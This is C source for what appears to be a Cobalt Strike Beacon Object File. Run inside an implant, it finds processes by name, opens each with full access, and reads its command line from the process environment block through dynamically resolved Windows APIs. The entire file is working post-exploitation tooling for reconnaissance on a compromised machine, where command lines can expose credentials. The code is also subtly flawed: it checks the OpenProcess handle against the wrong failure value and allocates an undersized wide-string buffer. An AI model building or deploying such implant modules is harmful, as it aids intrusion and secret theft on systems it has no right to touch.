#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "beacon.h"

#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }
DECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);
DECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);

VOID GetCommandLineInfo(DWORD PID);
VOID GetPIDByName(CHAR *name);

FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);
    return ptr;
}

VOID GetPIDByName(CHAR *name) {
	printf("Searching for %s\n", name);
	
	FARPROC CreateToolhelp32Snapshot = Resolver("kernel32.dll", "CreateToolhelp32Snapshot");
	FARPROC Process32First = Resolver("kernel32.dll", "Process32First");
	FARPROC Process32Next = Resolver("kernel32.dll", "Process32Next");
	FARPROC strcmp = Resolver("msvcrt.dll", "strcmp");	
	FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");	
	
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)) {
        do {
            if(strcmp(pe32.szExeFile, name) == 0) {
				printf("%s found with PID %d\n", pe32.szExeFile, pe32.th32ProcessID);
                GetCommandLineInfo(pe32.th32ProcessID);
            }
        } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}

VOID GetCommandLineInfo(DWORD PID) {
	FARPROC OpenProcess = Resolver("kernel32.dll", "OpenProcess");
	FARPROC NtQueryInformationProcess = Resolver("ntdll.dll", "NtQueryInformationProcess");
	FARPROC ReadProcessMemory = Resolver("kernel32.dll", "ReadProcessMemory");
	FARPROC GlobalAlloc = Resolver("kernel32.dll", "GlobalAlloc");		
	FARPROC GlobalFree = Resolver("kernel32.dll", "GlobalFree");		
	FARPROC CloseHandle = Resolver("kernel32.dll", "CloseHandle");	
	
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb;
    RTL_USER_PROCESS_PARAMETERS rupp;
    SIZE_T dwBytesRead = 0;
	
	if(hProc != INVALID_HANDLE_VALUE) {		

		NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
		ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(PEB), &dwBytesRead);
		ReadProcessMemory(hProc, peb.ProcessParameters, &rupp, sizeof(RTL_USER_PROCESS_PARAMETERS), &dwBytesRead);

		WCHAR *commandline = (WCHAR*)GlobalAlloc(GPTR, rupp.CommandLine.Length + 1);

		ReadProcessMemory(hProc, rupp.CommandLine.Buffer, commandline, rupp.CommandLine.Length, &dwBytesRead);
		printf("\nCommandLine DATA: %ls\n", commandline);
		CloseHandle(hProc);
		GlobalFree(commandline);
	}
}

VOID go(char * args, int length) { 
	datap parser;
	BeaconDataParse(&parser, args, length);
	CHAR *processName = BeaconDataExtract(&parser, NULL);
	GetPIDByName(processName);
}
